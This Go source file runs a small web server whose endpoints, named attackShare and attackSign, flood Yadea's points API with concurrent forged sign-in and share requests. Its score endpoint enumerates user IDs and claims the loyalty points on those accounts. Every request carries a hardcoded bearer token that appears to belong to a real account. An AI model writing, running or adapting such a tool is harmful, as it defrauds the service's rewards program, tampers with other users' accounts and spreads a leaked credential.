package main

import (
	"bytes"
	"encoding/json"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"net/http"
	"strconv"
)

type Score struct {
	Object struct {
		Details []struct {
			ID string `json:"id"`
		} `json:"details"`
		IntegralValue int `json:"integralValue"`
	} `json:"object"`
}

func main() {

	r := gin.Default()
	r.GET("/score", func(c *gin.Context) {
		l, _ := strconv.Atoi(c.Query("l"))
		r, _ := strconv.Atoi(c.Query("r"))
		var list []string
		for i := l; i <= r; i++ {
			list = append(list, getScore("eb00af92-bc6d-4c3f-9242-fang-tan"+strconv.Itoa(i)))
		}
		c.JSON(200, gin.H{
			"data": list,
		})
	})
	r.GET("/share", func(c *gin.Context) {
		id := "eb00af92-bc6d-4c3f-9242-fang-tan" + c.Query("id")
		attackShare(id)
		c.JSON(200, gin.H{
			"data": "刷分完毕",
		})
	})
	r.GET("/com", func(c *gin.Context) {
		id := "eb00af92-bc6d-4c3f-9242-fang-tan" + c.Query("id")
		attackSign(id)
		c.JSON(200, gin.H{
			"data": "刷分完毕",
		})
	})

	r.Run(":888")

}
func attackShare(id string) {
	for i := 0; i < 20; i++ {
		go func() {
			for j := 0; j < 20; j++ {
				dayShare(id)
			}
		}()
	}
}

func attackSign(id string) {
	for i := 0; i < 20; i++ {
		go func() {
			for j := 0; j < 20; j++ {
				daySign(id)
			}
		}()
	}
}

func getScore(id string) string {
	var scoreList Score
	client := &http.Client{}
	req, _ := http.NewRequest("GET", "https://cms-api.op.yadea.com.cn/operation-api/integral/user/details?userId="+id, nil)
	req.Header.Set("Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJGOTRYVy02NjZnOHBldzZuLUZMTkNaZDQ5eVFHWjItU0lFZEhJZVRyaFdVIn0.eyJleHAiOjE2Nzc1Mjg4NDksImlhdCI6MTY3NjY2NDg0OSwianRpIjoiYzQ0NGNlYWQtZjZlNi00ZTRjLTlhMjgtOWI0ZjM2NTdlZDY5IiwiaXNzIjoiaHR0cDovL2tleWNsb2FrLXNlcnZpY2UueWFkZWEvYXV0aC9yZWFsbXMvdmZseS1mcm9udC1tYXN0ZXItcmVhbG0iLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiZWIwMGFmOTItYmM2ZC00YzNmLTkyNDItZGE5YTA2NWYyOWQ0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiYXBpLWNsaSIsInNlc3Npb25fc3RhdGUiOiIxNjFhM2U3Mi0yZTFmLTQ5MjAtODJmNS01MjFhMmVlODkwNTUiLCJhY3IiOiIxIiwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm9mZmxpbmVfYWNjZXNzIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6ImVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsIm5pY2tuYW1lIjoi5a6z576e55qE55Sf5aecMTYzMCIsInByZWZlcnJlZF91c2VybmFtZSI6IjE3MjAxNzYxNjMwIn0.MrPnST94OdS8wOocXewtWBUpfHWoBh_jSKpD3Owzks3ruQ-2ES8Bxci0gFUMUQFii3eLKEOnSS3x-3VNSO90ssO5y0SjO2nS2x5N0ZvK6A7P_0Y29c1z-hpyyuwVi6aBBYcY9ELGwmxXBvdC3Ky7qvMQGwm53z9IHVyukfBd-xBs3OEooP1ZOXdsD7VKkziK_rbA8mmAKcWlXQQUZTkheFhEHGRQSHeCidJaBwq4A8arKc30f0b7HTBgOEp7E0JQCYmfiQvO36ALsyNCMM6hVoXbKAWsDykIB3PINtmYxQHRn06thii8VBXrhguYSmLrHHA2jXfWW9ELHPRiW3YCNw")
	resp, _ := client.Do(req)
	defer resp.Body.Close()
	res, _ := ioutil.ReadAll(resp.Body)
	json.Unmarshal(res, &scoreList)
	// 领取积分
	for _, item := range scoreList.Object.Details {
		req, _ = http.NewRequest("POST", "https://cms-api.op.yadea.com.cn/operation-api/integral/user/"+id+"/"+item.ID, nil)
		req.Header.Set("Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJGOTRYVy02NjZnOHBldzZuLUZMTkNaZDQ5eVFHWjItU0lFZEhJZVRyaFdVIn0.eyJleHAiOjE2Nzc1Mjg4NDksImlhdCI6MTY3NjY2NDg0OSwianRpIjoiYzQ0NGNlYWQtZjZlNi00ZTRjLTlhMjgtOWI0ZjM2NTdlZDY5IiwiaXNzIjoiaHR0cDovL2tleWNsb2FrLXNlcnZpY2UueWFkZWEvYXV0aC9yZWFsbXMvdmZseS1mcm9udC1tYXN0ZXItcmVhbG0iLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiZWIwMGFmOTItYmM2ZC00YzNmLTkyNDItZGE5YTA2NWYyOWQ0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiYXBpLWNsaSIsInNlc3Npb25fc3RhdGUiOiIxNjFhM2U3Mi0yZTFmLTQ5MjAtODJmNS01MjFhMmVlODkwNTUiLCJhY3IiOiIxIiwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm9mZmxpbmVfYWNjZXNzIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6ImVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsIm5pY2tuYW1lIjoi5a6z576e55qE55Sf5aecMTYzMCIsInByZWZlcnJlZF91c2VybmFtZSI6IjE3MjAxNzYxNjMwIn0.MrPnST94OdS8wOocXewtWBUpfHWoBh_jSKpD3Owzks3ruQ-2ES8Bxci0gFUMUQFii3eLKEOnSS3x-3VNSO90ssO5y0SjO2nS2x5N0ZvK6A7P_0Y29c1z-hpyyuwVi6aBBYcY9ELGwmxXBvdC3Ky7qvMQGwm53z9IHVyukfBd-xBs3OEooP1ZOXdsD7VKkziK_rbA8mmAKcWlXQQUZTkheFhEHGRQSHeCidJaBwq4A8arKc30f0b7HTBgOEp7E0JQCYmfiQvO36ALsyNCMM6hVoXbKAWsDykIB3PINtmYxQHRn06thii8VBXrhguYSmLrHHA2jXfWW9ELHPRiW3YCNw")
		resp, _ := client.Do(req)
		res, _ = ioutil.ReadAll(resp.Body)
	}
	req, _ = http.NewRequest("GET", "https://cms-api.op.yadea.com.cn/operation-api/integral/user/details?userId="+id, nil)
	req.Header.Set("Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJGOTRYVy02NjZnOHBldzZuLUZMTkNaZDQ5eVFHWjItU0lFZEhJZVRyaFdVIn0.eyJleHAiOjE2Nzc1Mjg4NDksImlhdCI6MTY3NjY2NDg0OSwianRpIjoiYzQ0NGNlYWQtZjZlNi00ZTRjLTlhMjgtOWI0ZjM2NTdlZDY5IiwiaXNzIjoiaHR0cDovL2tleWNsb2FrLXNlcnZpY2UueWFkZWEvYXV0aC9yZWFsbXMvdmZseS1mcm9udC1tYXN0ZXItcmVhbG0iLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiZWIwMGFmOTItYmM2ZC00YzNmLTkyNDItZGE5YTA2NWYyOWQ0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiYXBpLWNsaSIsInNlc3Npb25fc3RhdGUiOiIxNjFhM2U3Mi0yZTFmLTQ5MjAtODJmNS01MjFhMmVlODkwNTUiLCJhY3IiOiIxIiwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm9mZmxpbmVfYWNjZXNzIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6ImVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsIm5pY2tuYW1lIjoi5a6z576e55qE55Sf5aecMTYzMCIsInByZWZlcnJlZF91c2VybmFtZSI6IjE3MjAxNzYxNjMwIn0.MrPnST94OdS8wOocXewtWBUpfHWoBh_jSKpD3Owzks3ruQ-2ES8Bxci0gFUMUQFii3eLKEOnSS3x-3VNSO90ssO5y0SjO2nS2x5N0ZvK6A7P_0Y29c1z-hpyyuwVi6aBBYcY9ELGwmxXBvdC3Ky7qvMQGwm53z9IHVyukfBd-xBs3OEooP1ZOXdsD7VKkziK_rbA8mmAKcWlXQQUZTkheFhEHGRQSHeCidJaBwq4A8arKc30f0b7HTBgOEp7E0JQCYmfiQvO36ALsyNCMM6hVoXbKAWsDykIB3PINtmYxQHRn06thii8VBXrhguYSmLrHHA2jXfWW9ELHPRiW3YCNw")
	resp, _ = client.Do(req)
	defer resp.Body.Close()
	res, _ = ioutil.ReadAll(resp.Body)
	json.Unmarshal(res, &scoreList)
	return id + "当前积分 ->" + strconv.Itoa(scoreList.Object.IntegralValue)

}

func daySign(id string) {
	client := &http.Client{}
	req, _ := http.NewRequest("POST", "https://cms-api.op.yadea.com.cn/app-api/ygSign/in", bytes.NewReader([]byte("{\n  \"headImage\" : \"https:\\/\\/cms-oss.op.yadea.com.cn\\/avatar\\/avatar_490.png\",\n  \"nickName\" : \"任性的绿豆8211\",\n  \"userId\" : \""+id+"\",\n  \"signDate\" : \"2023-02-18 15:58:33\"\n}")))
	req.Header.Set("content-type", "application/json")
	req.Header.Set("Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJGOTRYVy02NjZnOHBldzZuLUZMTkNaZDQ5eVFHWjItU0lFZEhJZVRyaFdVIn0.eyJleHAiOjE2Nzc1Mjg4NDksImlhdCI6MTY3NjY2NDg0OSwianRpIjoiYzQ0NGNlYWQtZjZlNi00ZTRjLTlhMjgtOWI0ZjM2NTdlZDY5IiwiaXNzIjoiaHR0cDovL2tleWNsb2FrLXNlcnZpY2UueWFkZWEvYXV0aC9yZWFsbXMvdmZseS1mcm9udC1tYXN0ZXItcmVhbG0iLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiZWIwMGFmOTItYmM2ZC00YzNmLTkyNDItZGE5YTA2NWYyOWQ0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiYXBpLWNsaSIsInNlc3Npb25fc3RhdGUiOiIxNjFhM2U3Mi0yZTFmLTQ5MjAtODJmNS01MjFhMmVlODkwNTUiLCJhY3IiOiIxIiwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm9mZmxpbmVfYWNjZXNzIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6ImVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsIm5pY2tuYW1lIjoi5a6z576e55qE55Sf5aecMTYzMCIsInByZWZlcnJlZF91c2VybmFtZSI6IjE3MjAxNzYxNjMwIn0.MrPnST94OdS8wOocXewtWBUpfHWoBh_jSKpD3Owzks3ruQ-2ES8Bxci0gFUMUQFii3eLKEOnSS3x-3VNSO90ssO5y0SjO2nS2x5N0ZvK6A7P_0Y29c1z-hpyyuwVi6aBBYcY9ELGwmxXBvdC3Ky7qvMQGwm53z9IHVyukfBd-xBs3OEooP1ZOXdsD7VKkziK_rbA8mmAKcWlXQQUZTkheFhEHGRQSHeCidJaBwq4A8arKc30f0b7HTBgOEp7E0JQCYmfiQvO36ALsyNCMM6hVoXbKAWsDykIB3PINtmYxQHRn06thii8VBXrhguYSmLrHHA2jXfWW9ELHPRiW3YCNw")
	resp, _ := client.Do(req)
	defer resp.Body.Close()
}

func dayShare(id string) {
	client := &http.Client{}
	req, _ := http.NewRequest("POST", "https://cms-api.op.yadea.com.cn/app-api/content/user/share/"+id+"/1626849702434291714", nil)
	req.Header.Set("content-type", "application/json")
	req.Header.Set("Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJGOTRYVy02NjZnOHBldzZuLUZMTkNaZDQ5eVFHWjItU0lFZEhJZVRyaFdVIn0.eyJleHAiOjE2Nzc1Mjg4NDksImlhdCI6MTY3NjY2NDg0OSwianRpIjoiYzQ0NGNlYWQtZjZlNi00ZTRjLTlhMjgtOWI0ZjM2NTdlZDY5IiwiaXNzIjoiaHR0cDovL2tleWNsb2FrLXNlcnZpY2UueWFkZWEvYXV0aC9yZWFsbXMvdmZseS1mcm9udC1tYXN0ZXItcmVhbG0iLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiZWIwMGFmOTItYmM2ZC00YzNmLTkyNDItZGE5YTA2NWYyOWQ0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiYXBpLWNsaSIsInNlc3Npb25fc3RhdGUiOiIxNjFhM2U3Mi0yZTFmLTQ5MjAtODJmNS01MjFhMmVlODkwNTUiLCJhY3IiOiIxIiwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm9mZmxpbmVfYWNjZXNzIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6ImVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsIm5pY2tuYW1lIjoi5a6z576e55qE55Sf5aecMTYzMCIsInByZWZlcnJlZF91c2VybmFtZSI6IjE3MjAxNzYxNjMwIn0.MrPnST94OdS8wOocXewtWBUpfHWoBh_jSKpD3Owzks3ruQ-2ES8Bxci0gFUMUQFii3eLKEOnSS3x-3VNSO90ssO5y0SjO2nS2x5N0ZvK6A7P_0Y29c1z-hpyyuwVi6aBBYcY9ELGwmxXBvdC3Ky7qvMQGwm53z9IHVyukfBd-xBs3OEooP1ZOXdsD7VKkziK_rbA8mmAKcWlXQQUZTkheFhEHGRQSHeCidJaBwq4A8arKc30f0b7HTBgOEp7E0JQCYmfiQvO36ALsyNCMM6hVoXbKAWsDykIB3PINtmYxQHRn06thii8VBXrhguYSmLrHHA2jXfWW9ELHPRiW3YCNw")
	resp, _ := client.Do(req)
	defer resp.Body.Close()
}
